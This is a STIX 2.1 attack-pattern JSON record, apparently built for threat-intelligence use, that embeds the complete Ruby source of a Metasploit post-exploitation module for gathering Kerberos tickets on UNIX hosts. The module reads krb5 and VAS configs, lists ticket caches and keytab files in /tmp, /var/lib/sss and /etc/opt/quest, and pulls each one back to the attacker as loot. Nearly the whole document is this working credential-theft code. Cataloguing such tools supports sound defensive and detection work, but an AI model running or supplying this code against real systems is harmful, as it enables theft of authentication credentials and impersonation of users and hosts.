{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c412251-c704-4f5b-a60c-d1ef37b33b6c",
    "created": "2024-08-14T16:33:19.172937Z",
    "modified": "2024-08-14T16:33:19.172941Z",
    "name": "UNIX Gather Kerberos Tickets",
    "description": "Post Module to obtain all kerberos tickets on the targeted UNIX machine. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/unix_kerberos_tickets.rb",
            "external_id": "unix_kerberos_tickets.rb"
        }
    ],
    "x_code_snippet": "# Copyright (c) 2015-2018, Cisco International Ltd\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#     * Redistributions of source code must retain the above copyright\n#       notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above copyright\n#       notice, this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#     * Neither the name of the Cisco International Ltd nor the\n#       names of its contributors may be used to endorse or promote products\n#       derived from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n# DISCLAIMED. IN NO EVENT SHALL CISCO INTERNATIONAL LTD BE LIABLE FOR ANY\n# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'shellwords'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Post::Common\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'UNIX Gather Kerberos Tickets',\n        'Description' => %q{ Post Module to obtain all kerberos tickets on the targeted UNIX machine. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Tim Brown <timb[at]nth-dimension.org.uk>'],\n        'Platform' => %w[linux osx unix solaris aix],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options([\n      OptString.new('KRB_CONFIG_FILE', [true, 'The Kerberos config file.', '/etc/krb5.conf']),\n      OptString.new('VAS_CONFIG_FILE', [true, 'The VASD config file.', '/etc/opt/quest/vas/vas.conf']),\n    ])\n  end\n\n  def run\n    print_status('Finding files')\n    files = [ '/etc/opt/quest/vas/host.keytab' ]\n    configs = [datastore['KRB_CONFIG_FILE'], datastore['VAS_CONFIG_FILE']]\n    configs.each do |config_file|\n      if file? config_file\n        config = read_file(config_file)\n        if /\\n\\s*default_ccache_name\\s*=\\s*(?<cache_location>.*?)\\s*\\n/ =~ config || /\\n\\s*default_cc_name\\s*=\\s*(?<cache_location>.*?)\\s*\\n/ =~ config\n          if /^FILE:(?<file_pattern>.*%\\{uid\\}.*)/ =~ cache_location\n            suffix = ''\n          elsif /^DIR:(?<file_pattern>.*%\\{uid\\}.*)/ =~ cache_location\n            suffix = '/*'\n          elsif /^(?<storage>KEYRING|API|KCM|MEMORY|KSLSA):/ =~ cache_location\n            print_error(\"Kerberos ticket cache uses #{storage}. This module does not support this storage type.\")\n          else\n            print_error(\"Unknown storage type: #{cache_location}\")\n          end\n\n          if file_pattern\n            print_status(\"Kerberos tickets configured to be stored at #{file_pattern}\")\n            placeholder = 'MSF_INSERT_HERE'\n            # The krb5 pattern uses %{uid} as a wildcard. This is misinterpreted by Rubocop as a format string token\n            # rubocop: disable Style/FormatStringToken\n            file_pattern['%{uid}'] = placeholder\n            # rubocop: enable Style/FormatStringToken\n            # Need to do this two-step thing so Shellwords.escape doesn't escape the asterisk\n            file_pattern = Shellwords.escape(file_pattern)\n            file_pattern[placeholder] = '*'\n            files += cmd_exec(\"ls #{file_pattern}#{suffix}\").split(/\\r\\n|\\r|\\n/)\n          end\n        end\n      else\n        vprint_warning(\"Could not find #{config_file}\")\n      end\n    end\n    files += cmd_exec('ls /var/lib/sss/db/ccache_*').split(/\\r\\n|\\r|\\n/)\n    # Even though our config check should preclude this, it is a default location, so checking it may find something\n    files += cmd_exec('ls /tmp/krb5*').split(/\\r\\n|\\r|\\n/)\n    files = files.uniq\n    files = files.select { |d| file?(d) }\n    if files.nil? || files.empty?\n      print_error('No kerberos tickets found')\n      return\n    end\n    download_loot(files)\n  end\n\n  def download_loot(files)\n    print_status(\"Looting #{files.count} files\")\n    files.each do |file|\n      file.chomp!\n      sep = '/'\n      print_status(\"Downloading #{file}\")\n      data = read_file(file)\n      file = file.split(sep).last\n      loot_file = store_loot('unix_kerberos_tickets', 'application/octet-stream', session, data, \"unix_kerberos_tickets_#{file}\", 'Kerberos Tickets File')\n      print_good(\"File stored in: #{loot_file}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx unix solaris aix]"
    ]
}